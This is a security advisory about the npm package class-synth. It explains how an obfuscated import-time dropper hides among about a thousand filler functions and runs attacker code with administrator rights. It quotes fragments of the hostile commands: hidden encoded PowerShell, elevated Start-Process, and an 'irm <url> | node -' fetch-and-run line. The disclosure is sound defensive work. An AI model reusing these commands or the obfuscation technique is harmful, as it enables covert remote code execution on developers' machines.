summary: class-synth: import-time obfuscated PowerShell dropper executes attacker-controlled Node code with elevation
details: On `require`/`import` of class-synth, dist/index.js (the package main) runs an unconditional IIFE that dynamically resolves `node:fs`, `node:path`, `node:child_process`, and `node:crypto` from base64-encoded fragments to defeat static inspection. It then recursively scans the installer's current working directory for `.css` files containing an `@sri-hash: <base64>` marker, AES-256-CBC decrypts that marker with a hardcoded key to obtain a URL, base64-encodes a UTF-16LE PowerShell command, and spawns `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <...>` whose decoded body is `Start-Process node -ArgumentList... -Verb RunAs -WindowStyle Hidden` running `irm <url> | node -` — i.e., it downloads and executes attacker-controlled Node.js code with administrator elevation, hidden from the user. The bulk of the package is ~1000 near-duplicate filler functions (applyPreset1..150, createSequenceStep1..250, mapOperation1..250, etc.) acting as a cover surface to disguise the dropper. Any project that installs and imports class-synth on Windows triggers a hidden, elevated remote code execution on the developer/build machine.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
